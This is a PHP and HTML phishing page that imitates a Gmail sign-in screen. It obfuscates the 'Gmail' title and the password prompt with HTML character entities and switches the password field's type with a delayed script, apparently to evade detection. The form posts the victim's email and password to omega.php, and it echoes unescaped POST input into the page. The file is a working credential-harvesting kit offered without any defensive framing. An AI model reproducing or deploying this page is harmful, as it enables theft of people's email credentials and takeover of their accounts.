<?php

$id = $_POST['user'];

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#71;&#109;&#97;&#105;&#108;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[2].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #c4c4c4; 
    height: 56px; 
    width: 275px; 
  	font-family: Roboto,RobotoDraft,Helvetica,Arial,sans-serif;
    font-size: 18px;
  	color: #555;
	font-weight: 500;
    padding-left: 6px; 
    border-radius: 4px;
}  
.textbox:focus { 
    outline: none; 
    border: 2px solid #1a73e8;
} 
.textbox1 { 
    border: 1px solid #dadce0; 
    height: 32px; 
    width: 275px; 
  	font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
    font-size: 14px;
    font-weight: 600;
	letter-spacing: .25px;
  	color: #3c4043;
	text-align: center;
    padding-left: 0px; 
    border-radius: 14px;
}  
.textbox1:focus { 
    outline: none; 
    border: 2px solid #1a73e8;
} 
 </style><style type="text/css">
div#container
{
	position:relative;
	width: 463px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:463px; height:645px; z-index:0"><img src="images/j2.png" alt="" title="" border=0 width=463 height=645></div>
<form action="omega.php?name=$id" name=hamrahise id=hamrahise method=post>
       <input name="user1" value="<?=$id?>" type="hidden">
<input name="uname" value="<?=$id?>" placeholder="" class="textbox1" autocomplete="off" required type="text" style="position:absolute;width:310px;left:77px;top:206px;z-index:1">
<input name="pass" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:368px;left:46px;top:277px;z-index:2">
<div id="formimage1" style="position:absolute; left:325px; top:373px; z-index:3"><input type="image" name="formimage1" width="90" height="38" src="images/xt.png"></div>
<div id="image2" style="position:absolute; overflow:hidden; left:45px; top:383px; width:125px; height:20px; z-index:4"><a href="#"><img src="images/j3.png" alt="" title="" border=0 width=125 height=20></a></div>

</div>

</body>
</html>
